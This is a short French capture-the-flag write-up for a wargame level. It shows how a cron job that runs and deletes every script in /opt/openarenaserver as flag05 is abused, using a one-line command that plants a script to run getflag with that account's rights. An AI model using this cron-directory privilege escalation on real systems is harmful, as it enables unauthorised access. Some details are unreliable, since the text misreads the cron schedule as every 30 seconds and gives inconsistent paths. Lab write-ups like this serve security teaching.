En se connectant avec l'utilisateur, on peut voir un message: `You have new mail.`

Le programme mail n'étant pas installé sur le système, on peut voir les mails dans `/var/mail/level05`:

`*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`

Cette tache cron execute le script `/usr/bin/openarenaserver` toutes les 30 secondes en tant que `flag05`.

En ouvrant `/usr/bin/openarenaserver`, on obtient:

```
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

Ce script exécute dans bash tous les fichiers présent dans /opt/arenaserver avec une limite de temps d'exécution de 5 secondes puis supprime le script.
Tous ces scripts étant exécuter avec le compte flag05, on peut s'en servir pour exécuter getflag et récupérer le flag:

`echo "getflag > /tmp/flag05" > /opt/openarenaserver/getflag; sleep 35; cat /tmp/flag05`